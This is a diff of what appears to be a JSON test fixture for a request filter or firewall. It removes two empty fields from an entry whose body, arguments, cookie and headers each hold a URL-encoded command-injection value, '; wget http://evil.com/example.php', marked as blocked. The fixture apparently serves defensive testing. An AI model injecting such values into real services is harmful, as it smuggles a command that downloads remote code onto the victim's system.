@@ -5,8 +5,6 @@
         "Body": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "ARGS": "param%RND%=%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "Cookie": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
-        "URL": "",
-        "Referer": "",
         "Headers": "%3B%20wget%20http%3A%2F%2Fevil.com%2Fexample.php",
         "Blocked": true
       }
